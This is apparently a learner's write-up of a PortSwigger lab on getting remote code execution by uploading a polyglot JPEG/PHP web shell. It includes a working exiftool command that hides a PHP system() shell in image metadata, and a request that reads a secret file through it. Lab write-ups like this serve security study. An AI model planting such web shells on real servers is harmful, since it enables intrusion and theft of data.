# [Remote code execution via polyglot web shell upload] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-16
 
---
 
## Vulnerability / core concept
Polyglot Web Shell Upload

## What made me stuck
I was trying to create a polyglot file myself using magic bytes `FF D8 FF ...`. This obviously did not work. 
 
## What unblocked me
After some research, I found out the best way is to use actual `.jpg` file and add a property inside it with payload using `exiftool`.
 
---


## Attack path
1) First, we need to log in to have the upload functionality.
2) During inspection, we can notice that we cannot upload `.php` files. I got errors saying that `file is not valid image`. This error revealed that application expects valid image with valid bytes.
3) After seeing this error, I got an idea to use polyglot file. At first, I tried to create it myself, but I was not successful. Later on, after researching, I learnt that the best way is using `exiftool`. What I did is created a polyglot file with two extentions at the same time: `.php` and `.jpg`. `exiftool` added a `Comment` metadata to polyglot image that contained the `php` payload. During execution, `php` ignores all the garbage around it and only executes what is inside `<?php`. 
4) At first, I created my file like `.php.jpg` which did not work: it was showing just the picture without executing my payload. Then I decided to change it and made it `.jpg.php`. Now, when accessing `/files/avatars/webshell.jpg.php` I got magic bytes of image in form of text rather than image itself, and was able to execute system commands by query `?command=x`. 
5) Now, all we need to do is to read the `/home/carlos/secret` and solve this lab.

---


## Payload / key command
First we need to create a polyglot file with payload:
```bash
exiftool -Comment='<?php echo system($_GET['command']); ?>' real_image.jpeg -o webshell.jpg.php
```
This will create a polyglot image with Comment metadata that contains malicious payload that will be executed by web application.

Then we need to send the following request:
```bash
GET /files/avatars/polyglot.jpg.php?command=cat+/home/carlos/secret HTTP/1.1
...
```
This will retrieve the secret and we can solve the lab.

---


## What I'd recognize faster next time
It is always important to do research about something you do not know or know weak. By using external knowledge and combining it with our application understanding, it is possible to create creative payloads like polyglot payload.



